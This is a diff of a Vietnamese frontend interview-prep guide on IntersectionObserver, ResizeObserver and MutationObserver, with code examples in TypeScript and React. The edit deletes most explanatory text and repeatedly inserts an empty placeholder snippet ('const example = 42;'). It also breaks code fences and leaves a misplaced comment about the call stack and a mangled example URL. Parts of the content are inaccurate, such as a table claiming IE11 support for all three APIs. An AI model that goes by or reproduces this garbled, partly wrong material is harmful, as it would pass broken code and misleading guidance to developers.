    {} // Bundler assume MỌI module có side-effects
@@ -17686,11 +10260,13 @@ export default function Analytics() {
    {
      "sideEffects": false // Hoặc ["*.css", "polyfills.ts"]
    }
-   ```
 
-7. **❌ Dynamic Import Không Có Error Handling**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    // ❌ BAD: Không handle error
    const mod = await import('./module'); // Nếu fail → crash app
 
@@ -17702,72 +10278,12 @@ export default function Analytics() {
      console.error('Failed to load module:', error);
  // Chú giải: Fallback logic
    }
-   ```
 
----
----
-## 34. 👁️ Q34: Observer APIs - Intersection, Resize, Mutation Observer  
-
-**P1: Tên câu hỏi:** 👁️ Q34: Observer APIs - Intersection, Resize, Mutation Observer  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Observer APIs (IntersectionObserver, ResizeObserver, MutationObserver) theo dõi DOM changes hiệu quả hơn event listeners, chạy async, không block main thread."**
-
-**🔑 3 Observer APIs:**
-
-**1. IntersectionObserver - Lazy Loading & Visibility:**
-- Theo dõi element **vào/ra viewport** (hoặc ancestor container)
-- Use case: **Lazy load images**, infinite scroll, analytics (viewability tracking)
-- Thay thế: `scroll` event + `getBoundingClientRect()` (performance tồi!)
-- Options: `threshold` (0-1), `rootMargin` (offset viewport)
-
-**2. ResizeObserver - Responsive Components:**
-- Theo dõi **thay đổi kích thước element** (width/height)
-- Use case: Responsive charts, grid layouts, container queries
-- Thay thế: `window.resize` event (chỉ detect window, không detect element resize)
-- Tránh layout thrashing - browser optimize batch updates
-
-**3. MutationObserver - DOM Changes:**
-- Theo dõi **DOM tree modifications** (add/remove nodes, attribute changes)
-- Use case: Auto-init third-party widgets, debug, accessibility tools
-- Thay thế: Mutation Events (deprecated - synchronous, performance tồi)
-- Options: `childList`, `attributes`, `characterData`, `subtree`
-
-**⚠️ Lỗi Thường Gặp:**
-- Quên `disconnect()` khi unmount → memory leak
-- MutationObserver trong callback modify DOM → **infinite loop** (observe chính mình)
-- Dùng `scroll` event thay IntersectionObserver → jank, battery drain
-- ResizeObserver không debounce → fire quá nhiều, tự debounce nếu cần
-
-**💡 Kiến Thức Senior:**
-- **Performance**: Observers chạy **async** trong requestIdleCallback-like phase → không block rendering
-- **Batching**: Browser batch nhiều observations, callback nhận array entries
-- **IntersectionObserver v2**: Thêm `isVisible` flag (check occlusion, opacity, filters)
-- **Container Queries** (CSS) dùng ResizeObserver internally
-- **Best practice**: 1 observer cho nhiều elements (reuse) thay vì 1 observer/element
-
-
-
-
-**❓ Câu Hỏi:****
-
-Observer APIs là gì? Khi nào và tại sao nên dùng chúng thay vì event listeners truyền thống?
-
-
-**✅ Đáp Án Chi Tiết:**
-
-**🎯 Tổng Quan Observer APIs:**
-
-Observer APIs là nhóm Web APIs hiện đại cho phép **theo dõi (observe) các thay đổi** trong DOM một cách **bất đồng bộ và hiệu quả** mà không cần polling hay event listeners liên tục.
-
-**3 Observer APIs Quan Trọng:**
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 ┌──────────────────────────────────────────────────────────────┐
 │                    OBSERVER APIs                              │
 ├──────────────────────────────────────────────────────────────┤
@@ -17793,36 +10309,13 @@ Observer APIs là nhóm Web APIs hiện đại cho phép **theo dõi (observe) c
 │  │ • Thay thế: Mutation Events (deprecated)                │ │
 │  └─────────────────────────────────────────────────────────┘ │
 └──────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔍 1. INTERSECTION OBSERVER API (Quan Sát Giao Điểm)**
-
-**Khái niệm:**
-- API theo dõi khi một element **xuất hiện, biến mất hoặc giao nhau** với viewport (hoặc một element cha)
-- Sử dụng cho: Lazy loading images, Infinite scroll, Visibility tracking, Analytics
-
-**Hoạt động:**
-1. Tạo observer với callback function
-2. Đăng ký các elements cần theo dõi
-3. Callback được gọi **bất đồng bộ** khi element vào/ra khỏi vùng quan sát
-4. Browser engine tự tối ưu, không cần poll/scroll listener liên tục
-
-**Ưu điểm:**
-- ✅ **Hiệu năng cao**: Không block main thread, browser tối ưu internally
-- ✅ **API đơn giản**: Dễ sử dụng hơn scroll event + getBoundingClientRect()
-- ✅ **Linh hoạt**: Hỗ trợ threshold (ngưỡng %), rootMargin (trigger sớm/muộn)
-- ✅ **Giảm layout thrashing**: Không gây reflow/repaint như getBoundingClientRect()
-
-**Nhược điểm:**
-- ⚠️ Callback bất đồng bộ → không đảm bảo timing chính xác đến pixel
-- ⚠️ Cần polyfill cho browsers rất cũ (IE11-)
-- ⚠️ Không phù hợp cho logic cần đồng bộ chính xác
-
-**Code Example (TypeScript + React):**
-
-```typescript
+typescript
 import { useEffect, useRef, useState } from 'react';
 
  // Chú giải: ============================================
@@ -17835,7 +10328,7 @@ function LazyImage({ src, alt }: { src: string; alt: string }) {
   const imgRef = useRef<HTMLImageElement>(null);
   const [imageSrc, setImageSrc] = useState<string>(''); // Chú giải: Ảnh thật chưa load
   const [isLoaded, setIsLoaded] = useState(false);
-  
+
   useEffect(() => {
  // Chú giải: Tạo Intersection Observer
     const observer = new IntersectionObserver(
@@ -17845,11 +10338,11 @@ function LazyImage({ src, alt }: { src: string; alt: string }) {
           // entry.isIntersecting: true = element xuất hiện trong viewport
           if (entry.isIntersecting && !isLoaded) {
             console.log('✅ Image vào viewport, bắt đầu load:', src);
-            
+
  // Chú giải: Load ảnh thật
             setImageSrc(src);
             setIsLoaded(true);
-            
+
             // Ngừng observe sau khi load (không cần theo dõi nữa)
             observer.unobserve(entry.target);
           }
@@ -17857,29 +10350,29 @@ function LazyImage({ src, alt }: { src: string; alt: string }) {
       },
       {
         root: null, // null = observe trong viewport (màn hình)
-        
+
         // rootMargin: Mở rộng vùng observe
         // '50px' = trigger khi element còn cách viewport 50px
         // → Preload ảnh trước khi user nhìn thấy (UX mượt hơn)
         rootMargin: '50px',
-        
+
         // threshold: Ngưỡng % element hiển thị để trigger callback
  // Chú giải: 0.1 = trigger khi 10% element visible
         threshold: 0.1
       }
     );
-    
+
     // Bắt đầu observe image element
     if (imgRef.current) {
       observer.observe(imgRef.current);
     }
-    
+
  // Chú giải: Cleanup: Disconnect observer khi component unmount
     return () => {
       observer.disconnect();
     };
   }, [src, isLoaded]);
-  
+
   return (
     <div className="lazy-image-container">
       {!imageSrc ? (
@@ -17888,9 +10381,9 @@ function LazyImage({ src, alt }: { src: string; alt: string }) {
           <span>Đang tải...</span>
         </div>
       ) : (
-        <img 
+        <img
           ref={imgRef}
-          src={imageSrc} 
+          src={imageSrc}
           alt={alt}
           onLoad={() => console.log('✅ Image đã load xong')}
         />
@@ -17906,7 +10399,7 @@ function Gallery() {
     'https: // Chú giải: example.com/image2.jpg',
  // Chú giải: ... 100+ images
   ];
-  
+
   return (
     <div className="gallery">
       {images.map((src, i) => (
@@ -17935,21 +10428,21 @@ function InfiniteOrderList() {
   const [page, setPage] = useState(1);
   const [hasMore, setHasMore] = useState(true);
   const [isLoading, setIsLoading] = useState(false);
-  
+
   // Ref cho sentinel element (phần tử "canh gác" ở cuối list)
   const sentinelRef = useRef<HTMLDivElement>(null);
-  
+
  // Chú giải: Load more data
   const loadMoreOrders = async () => {
     if (isLoading || !hasMore) return;
-    
+
     setIsLoading(true);
     console.log(`📥 Đang load page ${page}...`);
-    
+
     try {
       const res = await fetch(`/api/orders?page=${page}&limit=20`);
       const newOrders = await res.json();
-      
+
       if (newOrders.length === 0) {
         setHasMore(false); // Hết data
         console.log('✅ Đã load hết orders');
@@ -17964,13 +10457,13 @@ function InfiniteOrderList() {
       setIsLoading(false);
     }
   };
-  
+
   useEffect(() => {
  // Chú giải: Tạo observer cho sentinel element
     const observer = new IntersectionObserver(
       (entries) => {
         const sentinel = entries[0];
-        
+
         // Khi sentinel xuất hiện trong viewport → load more
         if (sentinel.isIntersecting && hasMore && !isLoading) {
           console.log('🔄 Sentinel vào viewport → Load more...');
@@ -17983,30 +10476,30 @@ function InfiniteOrderList() {
         threshold: 0
       }
     );
-    
+
     if (sentinelRef.current) {
       observer.observe(sentinelRef.current);
     }
-    
+
     return () => observer.disconnect();
   }, [hasMore, isLoading, page]);
-  
+
  // Chú giải: Load initial data
   useEffect(() => {
     loadMoreOrders();
   }, []);
-  
+
   return (
     <div className="order-list">
       <h2>📋 Orders (Infinite Scroll)</h2>
-      
+
       {orders.map((order) => (
         <div key={order.id} className="order-item">
           <span>{order.symbol}</span>
           <span>${order.price}</span>
         </div>
       ))}
-      
+
       {/* Sentinel element: Phần tử "canh gác" ở cuối list */}
       <div ref={sentinelRef} style={{ height: 20 }}>
         {isLoading && <span>⏳ Đang tải thêm...</span>}
@@ -18032,7 +10525,7 @@ function InfiniteOrderList() {
 function VisibilityTracker({ children, id }: { children: React.ReactNode; id: string }) {
   const elementRef = useRef<HTMLDivElement>(null);
   const [visibilityPercentage, setVisibilityPercentage] = useState(0);
-  
+
   useEffect(() => {
     const observer = new IntersectionObserver(
       (entries) => {
@@ -18040,9 +10533,9 @@ function VisibilityTracker({ children, id }: { children: React.ReactNode; id: st
           // intersectionRatio: Tỷ lệ % element hiển thị (0.0 - 1.0)
           const percentage = Math.round(entry.intersectionRatio * 100);
           setVisibilityPercentage(percentage);
-          
+
           console.log(`👁️ Section "${id}" hiển thị: ${percentage}%`);
-          
+
  // Chú giải: Gửi analytics khi >50% visible
           if (percentage > 50) {
  // Chú giải: analytics.track('section_viewed', { id, percentage });
@@ -18054,14 +10547,14 @@ function VisibilityTracker({ children, id }: { children: React.ReactNode; id: st
         threshold: [0, 0.25, 0.5, 0.75, 1.0] // Track ở nhiều mức: 0%, 25%, 50%, 75%, 100%
       }
     );
-    
+
     if (elementRef.current) {
       observer.observe(elementRef.current);
     }
-    
+
     return () => observer.disconnect();
   }, [id]);
-  
+
   return (
     <div ref={elementRef} className="tracked-section">
       <div className="visibility-indicator">
@@ -18080,7 +10573,7 @@ function Article() {
         <h2>Phần 1: Giới thiệu</h2>
         <p>Nội dung...</p>
       </VisibilityTracker>
-      
+
       <VisibilityTracker id="section-2">
         <h2>Phần 2: Phát triển</h2>
         <p>Nội dung...</p>
@@ -18088,36 +10581,48 @@ function Article() {
     </article>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices (Thực Hành Tốt):**
-
-1. **✅ Dùng `rootMargin` để preload sớm**
-   ```typescript
+typescript
    rootMargin: '50px' // Load trước khi vào viewport 50px → UX mượt
-   ```
 
-2. **✅ Unobserve sau khi xử lý xong**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    if (entry.isIntersecting) {
      // Xử lý...
      observer.unobserve(entry.target); // Ngừng observe → tiết kiệm tài nguyên
    }
-   ```
 
-3. **✅ Dùng multiple thresholds cho tracking chi tiết**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    threshold: [0, 0.25, 0.5, 0.75, 1] // Track ở 5 mức độ
-   ```
 
-4. **✅ Kết hợp với native lazy loading**
-   ```html
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+html
    <img src="image.jpg" loading="lazy" /> <!-- Browser native lazy load -->
-   ```
 
-**Common Mistakes (Lỗi Thường Gặp):**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-```typescript
+typescript
 // ❌ LỖI 1: Dùng scroll event + getBoundingClientRect() (chậm, gây layout thrashing)
 window.addEventListener('scroll', () => {
   images.forEach((img) => {
@@ -18149,25 +10654,18 @@ useEffect(() => {
 useEffect(() => {
   const observer = new IntersectionObserver(callback);
   observer.observe(element);
-  
+
   return () => {
     observer.disconnect(); // Chú giải: ✅ Cleanup khi unmount
   };
 }, []);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔍 2. RESIZE OBSERVER API (Quan Sát Thay Đổi Kích Thước)**
-- Hoạt động: Đăng ký callback được gọi bất đồng bộ khi target element vào/ra khỏi vùng quan sát; engine tối ưu không cần poll/scroll listener liên tục.
-- Ưu điểm: Hiệu năng cao (không block main thread), API đơn giản, hỗ trợ threshold linh hoạt; giảm layout thrashing so với getBoundingClientRect() trong scroll.
-- Nhược điểm: Callback bất đồng bộ nên không đảm bảo timing chính xác pixel; cần polyfill cho trình duyệt rất cũ; không phù hợp cho logic cần sync chính xác.
-
-Chú thích: Dùng `rootMargin` để trigger sớm/muộn (ví dụ: lazy load trước khi vào viewport); `threshold` xác định % giao nhau để fire callback.
-
-**Code Example:**
-
-```ts
+ts
 // Lazy load images khi vào viewport
 const images = document.querySelectorAll('img[data-src]');
 
@@ -18204,18 +10702,13 @@ if (sentinel) loadMoreObserver.observe(sentinel);
 
  // Chú giải: Cleanup
  // Chú giải: loadMoreObserver.disconnect();
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Dùng `rootMargin` để preload sớm cho UX mượt
-- Unobserve sau khi xử lý xong (tránh callback thừa)
-- Dùng `threshold: [0, 0.25, 0.5, 0.75, 1]` nếu cần theo dõi nhiều mức độ
-- Kết hợp với `loading="lazy"` native cho ảnh
-
-**Mistakes:**
-
-```ts
+ts
 // ❌ Dùng scroll listener + getBoundingClientRect → chậm, layout thrashing
 window.addEventListener('scroll', () => {
   images.forEach((img) => {
@@ -18234,35 +10727,13 @@ const observer = new IntersectionObserver((entries) => {
     }
   });
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔍 2. RESIZE OBSERVER API (Quan Sát Thay Đổi Kích Thước)**
-
-**Khái niệm:**
-- API theo dõi **thay đổi kích thước của element** (width, height)
-- Sử dụng cho: Responsive components, Charts auto-resize, Dynamic layouts
-
-**Hoạt động:**
-1. Callback được gọi khi **content box hoặc border box** của element thay đổi
-2. Chạy **trước paint** để tránh visual flash
-3. Hỗ trợ nhiều box model: `content-box`, `border-box`, `device-pixel-content-box`
-
-**Ưu điểm:**
-- ✅ **Hiệu năng tốt hơn** window.resize + polling
-- ✅ **Phát hiện resize từ bất kỳ nguồn**: CSS, JavaScript, user action
-- ✅ **Per-element tracking**: Theo dõi từng element riêng lẻ (không phải toàn viewport)
-- ✅ **Không cần media queries**: Component tự responsive
-
-**Nhược điểm:**
-- ⚠️ Callback có thể fire liên tục khi animate
-- ⚠️ Cần debounce cho logic nặng
-- ⚠️ Có thể gây **infinite loop** nếu callback thay đổi size của chính element đang observe
-
-**Code Example (TypeScript + React):**
-
-```typescript
+typescript
 import { useEffect, useRef, useState } from 'react';
 
  // Chú giải: ============================================
@@ -18276,7 +10747,7 @@ function ResponsiveCard() {
   const cardRef = useRef<HTMLDivElement>(null);
   const [layout, setLayout] = useState<'horizontal' | 'vertical'>('horizontal');
   const [dimensions, setDimensions] = useState({ width: 0, height: 0 });
-  
+
   useEffect(() => {
  // Chú giải: Tạo Resize Observer
     const resizeObserver = new ResizeObserver((entries) => {
@@ -18284,10 +10755,10 @@ function ResponsiveCard() {
       for (const entry of entries) {
         // contentRect: Kích thước content box của element
         const { width, height } = entry.contentRect;
-        
+
         console.log(`📏 Card resize: ${width}x${height}`);
         setDimensions({ width, height });
-        
+
         // Tự động chuyển layout dựa vào width
         if (width < 500) {
           setLayout('vertical'); // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
@@ -18298,20 +10769,20 @@ function ResponsiveCard() {
         }
       }
     });
-    
+
  // Chú giải: Observe card element
     if (cardRef.current) {
       resizeObserver.observe(cardRef.current);
     }
-    
+
  // Chú giải: Cleanup khi unmount
     return () => {
       resizeObserver.disconnect();
     };
   }, []);
-  
+
   return (
-    <div 
+    <div
       ref={cardRef}
       className={`card ${layout}`}
       style={{
@@ -18349,45 +10820,45 @@ function TradingChart() {
   const containerRef = useRef<HTMLDivElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const chartInstance = useRef<any>(null); // Chú giải: Chart.js instance
-  
+
   useEffect(() => {
  // Chú giải: Khởi tạo chart
     if (canvasRef.current) {
       const ctx = canvasRef.current.getContext('2d');
  // Chú giải: chartInstance.current = new Chart(ctx, { ... });
     }
-    
+
     // Observe container (KHÔNG observe canvas trực tiếp)
     // Tại sao? Nếu observe canvas → canvas resize → observer fire → canvas resize lại → loop!
     const resizeObserver = new ResizeObserver((entries) => {
       const { width, height } = entries[0].contentRect;
-      
+
       console.log(`📊 Chart container resize: ${width}x${height}`);
-      
+
       // Resize chart để fit container
       if (chartInstance.current && canvasRef.current) {
         canvasRef.current.width = width;
         canvasRef.current.height = height;
-        
+
  // Chú giải: Update chart dimensions
         chartInstance.current.resize(width, height);
         console.log('✅ Chart đã resize');
       }
     });
-    
+
     // Observe parent container (KHÔNG phải canvas)
     if (containerRef.current) {
       resizeObserver.observe(containerRef.current);
     }
-    
+
     return () => {
       resizeObserver.disconnect();
  // Chú giải: chartInstance.current?.destroy();
     };
   }, []);
-  
+
   return (
-    <div 
+    <div
       ref={containerRef}
       className="chart-container"
       style={{ width: '100%', height: '400px', position: 'relative' }}
@@ -18407,29 +10878,29 @@ function TradingChart() {
 function AutoExpandTextarea() {
   const textareaRef = useRef<HTMLTextAreaElement>(null);
   const [height, setHeight] = useState(60); // Chú giải: Min height
-  
+
   useEffect(() => {
     const resizeObserver = new ResizeObserver((entries) => {
       const { height } = entries[0].contentRect;
-      
+
       // Chỉ log khi height thay đổi đáng kể (tránh spam)
       if (Math.abs(height - entries[0].target.clientHeight) > 5) {
         console.log(`✏️ Textarea height: ${height}px`);
         setHeight(height);
       }
     });
-    
+
     if (textareaRef.current) {
  // Chú giải: Observe textarea itself
       resizeObserver.observe(textareaRef.current);
     }
-    
+
     return () => resizeObserver.disconnect();
   }, []);
-  
+
   return (
     <div>
-      <textarea 
+      <textarea
         ref={textareaRef}
         placeholder="Type something..."
         style={{
@@ -18443,45 +10914,50 @@ function AutoExpandTextarea() {
     </div>
   );
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices (Thực Hành Tốt):**
-
-1. **✅ Debounce logic nặng với requestAnimationFrame**
-   ```typescript
+typescript
    const resizeObserver = new ResizeObserver((entries) => {
      requestAnimationFrame(() => {
        // Logic nặng (recalculate layout, re-render chart, etc.)
      });
    });
-   ```
 
-2. **✅ Observe parent container, KHÔNG phải element sẽ resize**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    // ❌ SAI: Observe canvas trực tiếp
    resizeObserver.observe(canvas);
-   
+
    // ✅ ĐÚNG: Observe parent container
    resizeObserver.observe(canvas.parentElement);
-   ```
 
-3. **✅ Disconnect khi component unmount**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    useEffect(() => {
      const observer = new ResizeObserver(callback);
      observer.observe(element);
-     
+
      return () => observer.disconnect(); // Chú giải: ✅ Cleanup
    }, []);
-   ```
 
-4. **✅ Dùng cho responsive components (thay thế media queries)**
-   - Media queries: Dựa vào viewport size
-   - ResizeObserver: Dựa vào component size → Reusable hơn
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**Common Mistakes (Lỗi Thường Gặp):**
-
-```typescript
+typescript
 // ❌ LỖI 1: Infinite Loop - Resize chính element đang observe
 const box = document.querySelector('.box') as HTMLElement;
 
@@ -18498,7 +10974,7 @@ let isResizing = false;
 const goodObserver = new ResizeObserver(() => {
   if (!isResizing) {
     isResizing = true;
-    
+
  // Chú giải: Logic resize
     requestAnimationFrame(() => {
       box.style.width = (box.offsetWidth + 10) + 'px';
@@ -18542,40 +11018,17 @@ function MyComponent() {
   useEffect(() => {
     const observer = new ResizeObserver(callback);
     observer.observe(element);
-    
+
     return () => observer.disconnect(); // Chú giải: ✅ Cleanup
   }, []);
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**🔍 3. MUTATION OBSERVER API (Quan Sát Thay Đổi DOM)**
-
-**Khái niệm:**
-- API theo dõi **thay đổi DOM tree**: thêm/xóa nodes, thay đổi attributes, thay đổi text content
-- Thay thế cho **Mutation Events** (deprecated - đã lỗi thời)
-- Sử dụng cho: Auto-init new elements, Debug DOM changes, Polyfill custom elements, Third-party integration
-
-**Hoạt động:**
-1. Callback được gọi **bất đồng bộ (microtask)** khi có mutation khớp config
-2. Browser **gom nhóm mutations** để giảm số lần gọi callback (batch processing)
-3. Hỗ trợ filter theo loại mutation: `childList`, `attributes`, `characterData`
-
-**Ưu điểm:**
-- ✅ **Hiệu năng tốt hơn** Mutation Events (deprecated)
-- ✅ **Linh hoạt**: Filter chính xác loại mutation cần quan tâm
-- ✅ **Observe subtree**: Theo dõi toàn bộ cây con (descendants)
-- ✅ **Track old values**: Lưu giá trị cũ của attributes/text
-
-**Nhược điểm:**
-- ⚠️ Callback bất đồng bộ → không real-time
-- ⚠️ Performance issue nếu observe toàn `document.body` với `subtree: true`
-- ⚠️ Logic phức tạp khi xử lý nhiều mutations cùng lúc
-
-**Code Example (TypeScript + React):**
-
-```typescript
+typescript
 import { useEffect, useRef } from 'react';
 
  // Chú giải: ============================================
@@ -18588,7 +11041,7 @@ import { useEffect, useRef } from 'react';
 function ThemeAwareComponent() {
   useEffect(() => {
     const root = document.documentElement; // Chú giải: <html> element
-    
+
  // Chú giải: Tạo Mutation Observer
     const themeObserver = new MutationObserver((mutations) => {
       // mutations: Danh sách các thay đổi DOM
@@ -18597,25 +11050,25 @@ function ThemeAwareComponent() {
         if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
           const newTheme = root.getAttribute('data-theme');
           const oldTheme = mutation.oldValue;
-          
+
           console.log(`🎨 Theme changed: ${oldTheme} → ${newTheme}`);
-          
+
  // Chú giải: Update chart colors, reload styles, etc.
           updateComponentTheme(newTheme);
         }
       });
     });
-    
+
  // Chú giải: Observe <html> element
     themeObserver.observe(root, {
       attributes: true,              // Theo dõi attributes thay đổi
       attributeFilter: ['data-theme'], // Chỉ quan tâm data-theme (ignore các attributes khác)
       attributeOldValue: true        // Lưu giá trị cũ (để so sánh)
     });
-    
+
     return () => themeObserver.disconnect();
   }, []);
-  
+
   return <div>Theme-aware content...</div>;
 }
 
@@ -18635,7 +11088,7 @@ function updateComponentTheme(theme: string | null) {
 function AutoInitializer() {
   useEffect(() => {
     const container = document.querySelector('#dynamic-content') as HTMLElement;
-    
+
     const nodeObserver = new MutationObserver((mutations) => {
       mutations.forEach((mutation) => {
         // Chỉ quan tâm nodes được thêm vào
@@ -18643,19 +11096,19 @@ function AutoInitializer() {
           // Kiểm tra node type (chỉ xử lý element nodes)
           if (node.nodeType === Node.ELEMENT_NODE) {
             const element = node as HTMLElement;
-            
+
  // Chú giải: Auto-init tooltips
             if (element.matches('[data-tooltip]')) {
               console.log('✨ Init tooltip cho:', element);
               initTooltip(element);
             }
-            
+
  // Chú giải: Auto-init modals
             if (element.matches('[data-modal]')) {
               console.log('✨ Init modal cho:', element);
               initModal(element);
             }
-            
+
  // Chú giải: Auto-init date pickers
             if (element.matches('.date-picker')) {
               console.log('✨ Init date picker cho:', element);
@@ -18665,15 +11118,15 @@ function AutoInitializer() {
         });
       });
     });
-    
+
     nodeObserver.observe(container, {
       childList: true, // Theo dõi thêm/xóa node con
       subtree: true    // Theo dõi cả các node con sâu hơn (descendants)
     });
-    
+
     return () => nodeObserver.disconnect();
   }, []);
-  
+
   return <div id="dynamic-content">Content will be added here...</div>;
 }
 
@@ -18700,38 +11153,38 @@ function DOMDebugger() {
   useEffect(() => {
     const debugObserver = new MutationObserver((mutations) => {
       console.group(`🔍 ${mutations.length} DOM mutations detected`);
-      
+
       mutations.forEach((mutation, index) => {
         console.log(`\n[${index + 1}] Type: ${mutation.type}`);
-        
+
         if (mutation.type === 'childList') {
           // Nodes được thêm
           if (mutation.addedNodes.length > 0) {
             console.log('  ➕ Added nodes:', Array.from(mutation.addedNodes));
           }
-          
+
           // Nodes bị xóa
           if (mutation.removedNodes.length > 0) {
             console.log('  ➖ Removed nodes:', Array.from(mutation.removedNodes));
           }
         }
-        
+
         if (mutation.type === 'attributes') {
           console.log('  🏷️ Attribute changed:', mutation.attributeName);
           console.log('     Old value:', mutation.oldValue);
           console.log('     New value:', (mutation.target as Element).getAttribute(mutation.attributeName!));
         }
-        
+
         if (mutation.type === 'characterData') {
           console.log('  📝 Text changed');
           console.log('     Old:', mutation.oldValue);
           console.log('     New:', mutation.target.textContent);
         }
       });
-      
+
       console.groupEnd();
     });
-    
+
     // Observe toàn bộ document (CHỈ cho debug, KHÔNG dùng production)
     debugObserver.observe(document.body, {
       childList: true, // Chú giải: Track add/remove nodes
@@ -18741,52 +11194,62 @@ function DOMDebugger() {
       attributeOldValue: true, // Lưu giá trị cũ
       characterDataOldValue: true
     });
-    
+
     return () => debugObserver.disconnect();
   }, []);
-  
+
   return <div>DOM Debugger active...</div>;
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices (Thực Hành Tốt):**
-
-1. **✅ Filter chính xác loại mutation**
-   ```typescript
+typescript
    observer.observe(element, {
      attributes: true,
      attributeFilter: ['data-state', 'aria-expanded'], // Chỉ 2 attributes này
      // KHÔNG: attributes: true (quan sát TẤT CẢ attributes)
    });
-   ```
 
-2. **✅ Dùng `attributeFilter` để giảm noise**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    // ❌ Quan sát tất cả attributes → callback fire rất nhiều
    { attributes: true }
-   
+
    // ✅ Chỉ quan sát 1 attribute cụ thể
    { attributes: true, attributeFilter: ['data-theme'] }
-   ```
 
-3. **✅ Disconnect khi không cần**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    useEffect(() => {
      const observer = new MutationObserver(callback);
      observer.observe(element, config);
-     
+
      return () => observer.disconnect(); // Chú giải: ✅ Cleanup
    }, []);
-   ```
 
-4. **✅ Debounce/batch xử lý mutations**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    let mutationQueue: MutationRecord[] = [];
    let timeoutId: number;
-   
+
    const observer = new MutationObserver((mutations) => {
      mutationQueue.push(...mutations);
-     
+
      clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        // Xử lý tất cả mutations cùng lúc
@@ -18794,11 +11257,13 @@ function DOMDebugger() {
        mutationQueue = [];
      }, 100);
    });
-   ```
 
-**Common Mistakes (Lỗi Thường Gặp):**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-```typescript
+typescript
 // ❌ LỖI 1: Observe toàn document với subtree → Rất chậm
 const badObserver = new MutationObserver((mutations) => {
   // ❌ Logic nặng chạy mỗi khi DOM thay đổi (rất nhiều lần)
@@ -18842,7 +11307,7 @@ function Component() {
   useEffect(() => {
     const observer = new MutationObserver(callback);
     observer.observe(document.body, config);
-    
+
     return () => observer.disconnect(); // Chú giải: ✅ Cleanup
   }, []);
 }
@@ -18863,19 +11328,18 @@ const asyncObserver = new MutationObserver((mutations) => {
   const addedElements = mutations
     .flatMap(m => Array.from(m.addedNodes))
     .filter(n => n.nodeType === Node.ELEMENT_NODE);
-  
+
   // Xử lý async
   queueMicrotask(() => {
     processElementsBatch(addedElements);
   });
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**📊 So Sánh 3 Observer APIs:**
-
-```
 ┌─────────────────────┬──────────────────────┬─────────────────────┬─────────────────────┐
 │ Tiêu Chí            │ Intersection         │ Resize              │ Mutation            │
 ├─────────────────────┼──────────────────────┼─────────────────────┼─────────────────────┤
@@ -18889,104 +11353,12 @@ const asyncObserver = new MutationObserver((mutations) => {
 │                     │                      │                     │ observe rộng        │
 │ Browser Support     │ Modern (IE11+)       │ Modern (IE11+)      │ Modern (IE11+)      │
 └─────────────────────┴──────────────────────┴─────────────────────┴─────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Khi Nào Dùng Observer Nào?**
-
-- **Intersection Observer**: Lazy loading, Infinite scroll, Visibility tracking
-- **Resize Observer**: Responsive components, Charts, Dynamic layouts
-- **Mutation Observer**: Auto-init elements, Debug DOM, Third-party integration
-
-**✅ Tổng Kết:**
-
-Observer APIs là công cụ mạnh mẽ để theo dõi thay đổi DOM một cách hiệu quả. Key takeaways:
-
-1. **Hiệu năng tốt hơn** event listeners truyền thống
-2. **Bất đồng bộ** → không block main thread
-3. **Cần cleanup** đúng cách → tránh memory leak
-4. **Filter chính xác** → tránh callback fire thừa
-5. **Debounce logic nặng** → tránh performance issue
-
----
----
-## 35. 📈 Q35: Độ Phức Tạp Thuật Toán (Big O) - Map, Set, Array, Object  
-
-**P1: Tên câu hỏi:** 📈 Q35: Độ Phức Tạp Thuật Toán (Big O) - Map, Set, Array, Object  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Big O mô tả performance khi data scale. Map/Set = O(1) average (hash table), Array = O(1) index access nhưng O(n) search, Object = O(1) property access."**
-
-**🔑 Performance Comparison:**
-
-| **Operation** | **Map/Set** | **Object** | **Array** |
-|--------------|------------|-----------|----------|
-| **Access** | O(1) avg | O(1) | O(1) - index, O(n) - search |
-| **Insert** | O(1) avg | O(1) | O(1) - end, O(n) - start/middle |
-| **Delete** | O(1) avg | O(1) | O(1) - end, O(n) - start/middle |
-| **Search** | O(1) - `.has()` | O(n) - loop keys | O(n) - `.indexOf()` |
-| **Iterate** | O(n) | O(n) | O(n) |
-
